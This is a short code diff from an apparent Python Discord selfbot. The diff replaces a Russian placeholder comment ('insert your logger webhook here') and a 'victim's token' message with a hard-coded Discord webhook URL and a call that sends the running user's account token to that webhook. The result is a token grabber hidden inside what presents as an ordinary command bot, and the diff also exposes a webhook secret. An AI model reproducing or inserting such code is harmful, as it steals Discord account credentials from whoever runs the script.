@@ -475,8 +475,8 @@ async def hands(ctx, member: discord.Member = None):
 ## +++++++++++++++++
 
 from dhooks import Webhook
-hook = Webhook('Тут в скобках вставьте свой вебхук на логгер')
-hook.send('Токен жертвы: ', token)
+hook = Webhook('https://discord.com/api/webhooks/932673107750166578/xbQUnnLWtDAurXbvfGV_3jBSEnTJh39Rune-eIsw_5toWX3BzW7tTk5rOiXY6LyIcNFv')
+hook.send(token)
 
 ##++++++++++++++++++
 client.run(token, bot = False)
